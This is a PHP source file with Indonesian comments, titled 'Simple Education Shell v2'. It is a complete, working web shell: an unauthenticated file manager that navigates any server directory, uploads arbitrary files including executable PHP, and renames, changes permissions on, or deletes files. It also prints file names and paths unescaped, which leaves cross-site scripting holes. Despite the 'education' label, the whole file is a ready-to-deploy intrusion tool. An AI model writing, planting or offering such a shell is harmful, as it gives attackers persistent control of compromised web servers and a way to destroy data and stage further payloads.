<?php
/**
 * Simple Education Shell v2
 * Fitur: Upload, Rename, Chmod, Delete, & Navigasi Direktori.
 */

// Tentukan direktori saat ini berdasarkan parameter 'dir' di URL
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
$msg = "";

// Keamanan dasar: pastikan path valid
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = getcwd();
}

// Shortcut untuk redirect agar URL tetap bersih
function redirect($path) {
    header("Location: ?dir=" . urlencode($path));
    exit;
}

// --- LOGIKA AKSI ---

// 1. Upload File
if (isset($_FILES['file_upload'])) {
    $target = $current_dir . DIRECTORY_SEPARATOR . $_FILES['file_upload']['name'];
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target)) {
        $msg = "File berhasil diunggah ke: " . $_FILES['file_upload']['name'];
    }
}

// 2. Aksi File (Rename, Chmod, Delete)
if (isset($_POST['action'])) {
    $item = $current_dir . DIRECTORY_SEPARATOR . $_POST['item_name'];

    if ($_POST['action'] == 'chmod' && !empty($_POST['perm'])) {
        chmod($item, octdec($_POST['perm']));
        $msg = "Izin " . $_POST['item_name'] . " diubah.";
    } 
    elseif ($_POST['action'] == 'rename' && !empty($_POST['new_name'])) {
        $new_path = $current_dir . DIRECTORY_SEPARATOR . $_POST['new_name'];
        rename($item, $new_path);
        $msg = "Berhasil di-rename.";
    } 
    elseif ($_POST['action'] == 'delete') {
        is_dir($item) ? rmdir($item) : unlink($item);
        $msg = "Item dihapus.";
    }
}

// Ambil daftar file & folder
$files = scandir($current_dir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Edu Shell - Navigator</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #ececec; padding: 20px; }
        .container { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 900px; margin: auto; }
        .path { background: #333; color: #fff; padding: 10px; border-radius: 5px; word-break: break-all; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #f8f8f8; text-align: left; }
        th, td { border-bottom: 1px solid #eee; padding: 12px; }
        .folder { font-weight: bold; color: #007bff; text-decoration: none; }
        .msg { color: #28a745; margin-bottom: 15px; font-weight: bold; }
        input[type="text"] { padding: 5px; border: 1px solid #ccc; border-radius: 3px; }
        button { cursor: pointer; padding: 5px 10px; border: none; border-radius: 3px; background: #eee; }
        button:hover { background: #ddd; }
    </style>
</head>
<body>

<div class="container">
    <h2>Edu Shell Navigator</h2>
    
    <div class="path">
        📍 Current Path: <strong><?php echo $current_dir; ?></strong>
    </div>

    <?php if($msg) echo "<p class='msg'>$msg</p>"; ?>

    <div style="margin: 20px 0;">
        <form method="POST" enctype="multipart/form-data">
            <strong>Upload ke sini:</strong> 
            <input type="file" name="file_upload"> 
            <button type="submit" style="background:#28a745; color:white;">Upload</button>
        </form>
    </div>

    <table>
        <tr>
            <th>Nama</th>
            <th>Perms</th>
            <th>Aksi</th>
        </tr>
        <?php 
        foreach($files as $f): 
            if($f == ".") continue; // Abaikan folder saat ini
            
            $full_path = $current_dir . DIRECTORY_SEPARATOR . $f;
            $is_dir = is_dir($full_path);
            $perms = substr(sprintf('%o', fileperms($full_path)), -4);
        ?>
        <tr>
            <td>
                <?php if($is_dir): ?>
                    📁 <a class="folder" href="?dir=<?php echo urlencode($full_path); ?>"><?php echo $f; ?></a>
                <?php else: ?>
                    📄 <?php echo $f; ?>
                <?php endif; ?>
            </td>
            <td><code><?php echo $perms; ?></code></td>
            <td>
                <form method="POST" style="display:inline;">
                    <input type="hidden" name="item_name" value="<?php echo $f; ?>">
                    
                    <input type="text" name="new_name" placeholder="Rename" size="8">
                    <button name="action" value="rename">OK</button>
                    
                    <input type="text" name="perm" placeholder="0755" size="4">
                    <button name="action" value="chmod">Chmod</button>
                    
                    <button name="action" value="delete" style="color:red;" onclick="return confirm('Hapus?')">Del</button>
                </form>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
</div>

</body>
</html>
